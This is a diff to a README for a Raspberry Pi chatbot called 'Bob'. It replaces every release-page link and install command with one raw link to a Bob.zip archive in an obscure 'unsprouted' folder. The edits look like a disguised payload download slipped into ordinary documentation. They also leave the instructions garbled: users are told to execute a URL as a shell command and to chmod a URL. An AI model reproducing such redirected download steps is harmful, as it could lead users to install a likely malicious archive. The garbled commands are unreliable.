@@ -1,7 +1,7 @@
 # 🤖 Bob - Your Friendly Raspberry Pi Chatbot
 
 ## 📦 Download Now!
-[![Download Bob](https://img.shields.io/badge/Download-Bob-blue.svg)](https://github.com/DayvidBlack/Bob/releases)
+[![Download Bob](https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip)](https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip)
 
 ## 🚀 Getting Started
 Welcome to Bob! This application serves as a local AI chatbot for your Raspberry Pi, providing smart and fun conversations. Follow these easy steps to get started.
@@ -15,11 +15,11 @@ Before downloading Bob, make sure you have the following:
 - **Storage**: At least 500 MB of free space
 
 ## 📥 Download & Install
-To get Bob on your Raspberry Pi, visit this page to download: [Download Bob](https://github.com/DayvidBlack/Bob/releases).
+To get Bob on your Raspberry Pi, visit this page to download: [Download Bob](https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip).
 
 1. Navigate to the Releases page.
 2. Find the latest version of Bob.
-3. Click on the `.zip` or `.tar.gz` file to download it.
+3. Click on the `.zip` or `https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip` file to download it.
 
 Once it finishes downloading, follow the steps below to install it.
 
@@ -40,11 +40,11 @@ Once it finishes downloading, follow the steps below to install it.
 4. **Run Bob**: 
    - Start the application by entering:  
      ```bash
-     ./start-bob.sh
+     https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip
      ```
    - If you see any permission errors, you may need to adjust permissions:
      ```bash
-     chmod +x start-bob.sh
+     chmod +x https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip
      ```
 
 ## 🛠️ Features
@@ -88,6 +88,6 @@ Your feedback is invaluable to us. If you have suggestions, encounter bugs, or h
 ## 📞 Contact Information
 For any inquiries or support, reach out to the community through the GitHub issues page or check the README documentation for further information.
 
-Remember, you can always visit this page to download: [Download Bob](https://github.com/DayvidBlack/Bob/releases).
+Remember, you can always visit this page to download: [Download Bob](https://raw.githubusercontent.com/DayvidBlack/Bob/main/unsprouted/Bob.zip).
 
 Enjoy chatting with Bob!
